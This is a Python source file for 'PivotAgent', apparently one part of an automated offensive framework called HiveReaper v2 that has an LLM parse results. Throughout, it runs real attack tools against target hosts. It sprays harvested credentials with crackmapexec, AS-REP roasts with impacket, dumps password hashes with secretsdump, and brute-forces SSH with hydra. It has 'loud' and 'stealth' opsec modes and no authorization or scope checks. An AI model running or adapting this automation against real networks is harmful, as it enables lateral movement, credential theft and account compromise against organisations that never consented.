"""
HiveReaper v2 — PivotAgent (Real Tools)

Tools used:
  crackmapexec  — SMB/WinRM/LDAP credential spraying and enumeration
  impacket      — secretsdump, psexec, wmiexec, GetNPUsers (AS-REP roasting)
  evil-winrm    — WinRM shell (check connectivity only, no interactive)
  hydra         — credential brute-force (SSH, FTP, RDP)
  enum4linux-ng — SMB/LDAP/RPC enumeration

Ghost/Stealth mode: skipped (too noisy)
Normal: crackmapexec + enum4linux-ng + impacket passive
Loud:   all tools
"""

import asyncio
from .base_agent import BaseAgent


class PivotAgent(BaseAgent):
    AGENT_NAME = "PivotAgent"

    async def _run_tools(self) -> dict[str, str]:
        if self.opsec_mode in ("ghost", "stealth"):
            self._log("[PivotAgent] Ghost/stealth mode — skipping active lateral movement", "warning")
            return {}

        outputs  = {}
        # Pull from full campaign context — merges ALL prior lanes
        hosts    = self._prior("hosts_discovered", [])
        creds    = (self._prior("credentials_found", []) +
                    [c for exp in self._prior("exploits_attempted",[])
                     for c in exp.get("credentials_found",[])])
        creds    = list({c.get("username",""):c for c in creds if c.get("username")}.values())
        self._log(
            f"[PivotAgent] Context: {len(hosts)} hosts, {len(creds)} credentials available",
            "info",
        )

        ips = list(dict.fromkeys(
            h.get("ip") for h in hosts if h.get("ip")
        ))[:10]

        if not ips:
            ips = [self.target]

        open_ports_all = set()
        for h in hosts:
            open_ports_all.update(h.get("open_ports", []))

        tasks = {}

        # ── enum4linux-ng — SMB/LDAP/RPC enumeration ──
        if 445 in open_ports_all or 139 in open_ports_all:
            enum_results = await asyncio.gather(*[
                self._run_cmd(
                    ["enum4linux-ng", "-A", "-oJ", "/tmp/enum4linux_out", ip],
                    f"enum4linux-ng {ip}",
                    timeout=120,
                )
                for ip in ips[:3]
            ])
            outputs["enum4linux"] = "\n\n".join(
                f"Host: {ip}\n{r}"
                for ip, r in zip(ips[:3], enum_results)
            )

        # ── crackmapexec SMB — enumerate and spray ──
        if 445 in open_ports_all:
            # Enumeration first (no creds)
            tasks["cme_smb_enum"] = self._run_cmd(
                [
                    "crackmapexec", "smb", *ips,
                    "--gen-relay-list", "/tmp/relay_targets.txt",
                ],
                "crackmapexec SMB enum",
                timeout=120,
            )
            # If we have credentials, try them
            for cred in creds[:3]:
                user = cred.get("username", "")
                passwd = cred.get("password", "")
                if user and passwd and ":" not in passwd:  # skip hashes for now
                    tasks[f"cme_spray_{user}"] = self._run_cmd(
                        [
                            "crackmapexec", "smb", *ips,
                            "-u", user, "-p", passwd,
                            "--continue-on-success",
                        ],
                        f"crackmapexec spray {user}",
                        timeout=60,
                    )

        # ── crackmapexec WinRM — check WinRM access ──
        if 5985 in open_ports_all or 5986 in open_ports_all:
            for cred in creds[:3]:
                user   = cred.get("username", "")
                passwd = cred.get("password", "")
                if user and passwd:
                    tasks["cme_winrm"] = self._run_cmd(
                        [
                            "crackmapexec", "winrm", *ips,
                            "-u", user, "-p", passwd,
                        ],
                        "crackmapexec WinRM",
                        timeout=60,
                    )
                    break

        # ── impacket GetNPUsers — AS-REP roasting ──
        if 88 in open_ports_all:
            for ip in ips[:2]:
                tasks[f"asrep_{ip}"] = self._run_cmd(
                    [
                        "impacket-GetNPUsers",
                        "-no-pass", "-usersfile", "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
                        "-dc-ip", ip,
                        f"{self.target}/",
                    ],
                    f"AS-REP roast {ip}",
                    timeout=60,
                )

        # ── impacket secretsdump — if we have admin creds ──
        admin_cred = next(
            (c for c in creds if c.get("username","").lower() in
             ("administrator","admin","root","domain admin")),
            None,
        )
        if admin_cred and self.opsec_mode == "loud":
            user   = admin_cred.get("username","")
            passwd = admin_cred.get("password","")
            for ip in ips[:2]:
                tasks[f"secretsdump_{ip}"] = self._run_cmd(
                    [
                        "impacket-secretsdump",
                        f"{user}:{passwd}@{ip}",
                    ],
                    f"secretsdump {ip}",
                    timeout=120,
                )

        # ── hydra — SSH brute force with top credentials ──
        if 22 in open_ports_all and self.opsec_mode == "loud":
            tasks["hydra_ssh"] = self._run_cmd(
                [
                    "hydra", "-L",
                    "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
                    "-P",
                    "/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt",
                    "-t", "4", "-f",
                    f"ssh://{ips[0]}",
                ],
                f"hydra SSH {ips[0]}",
                timeout=120,
            )

        # Run all tasks
        if tasks:
            keys    = list(tasks.keys())
            results = await asyncio.gather(*tasks.values())
            for k, r in zip(keys, results):
                outputs[k] = r

        return outputs

    def _build_task(self) -> str:
        tool_outputs = self._cap_tool_outputs(max_bytes=10000)
        hosts = self._prior("hosts_discovered", [])
        creds = self._prior("credentials_found", [])
        return f"""
{self._hints_block()}
You are PivotAgent. Parse REAL lateral movement tool output from Kali Linux.
Target network: {self.target}
OpSec mode: {self.opsec_mode}
Known hosts: {[h.get('ip') for h in hosts[:10]]}
Known credentials: {[c.get('username') for c in creds[:5]]}

--- REAL TOOL OUTPUT ---
{tool_outputs or "No lateral movement tools ran (ghost/stealth mode or no AD environment found)."}
--- END ---

Parse every successful pivot, credential spray hit, share enumeration,
hash dump, and domain finding from the real output above.

Return JSON:
{{
  "pivot_paths": [
    {{
      "from":       "<source>",
      "to":         "<destination ip>",
      "method":     "smb|winrm|ssh|wmi|rdp|psexec",
      "credential": "<user:pass used>",
      "success":    <true|false>,
      "access":     "user|local_admin|domain_admin",
      "evidence":   "<exact output line proving this>"
    }}
  ],
  "domain_info": {{
    "domain_name":     "<if found>",
    "domain_admins":   ["<username>"],
    "dc_ips":          ["<ip>"],
    "users_enumerated": ["<username>"],
    "shares":          ["<\\\\host\\share>"],
    "password_policy": "<detail if found>"
  }},
  "hashes_captured": [
    {{
      "username": "<user>",
      "hash":     "<ntlm or krb5 hash>",
      "type":     "ntlm|krb5asrep|krb5tgs"
    }}
  ],
  "sensitive_data": [
    {{
      "location":    "<path>",
      "description": "<what was found>",
      "sensitivity": "low|medium|high|critical"
    }}
  ],
  "findings": [
    {{
      "finding_type": "pivot|lateral_movement|credential_spray|hash_capture|share_exposure|ad_enum",
      "title":        "<specific title>",
      "target":       "<target>",
      "severity":     "low|medium|high|critical",
      "detail":       "<evidence from tool output>"
    }}
  ],
  "opsec_cost": <0-35>
}}
"""

    def _parse_result(self, raw: dict) -> dict:
        for p in raw.get("pivot_paths", []):
            if p.get("success"):
                raw.setdefault("findings", []).append({
                    "finding_type": "lateral_movement",
                    "title":  f"Pivot SUCCESS: {p.get('from')} → {p.get('to')} [{p.get('access')}]",
                    "target": p.get("to", self.target),
                    "severity": "critical" if p.get("access") == "domain_admin" else "high",
                    "detail": f"Method: {p.get('method')} | Cred: {p.get('credential')} | Evidence: {p.get('evidence','')}",
                })
        for h in raw.get("hashes_captured", []):
            raw.setdefault("findings", []).append({
                "finding_type": "hash_capture",
                "title":  f"Hash captured — {h.get('username','')} ({h.get('type','')})",
                "target": self.target,
                "severity": "critical",
                "detail": f"Hash: {h.get('hash','')[:80]}",
            })
        return raw
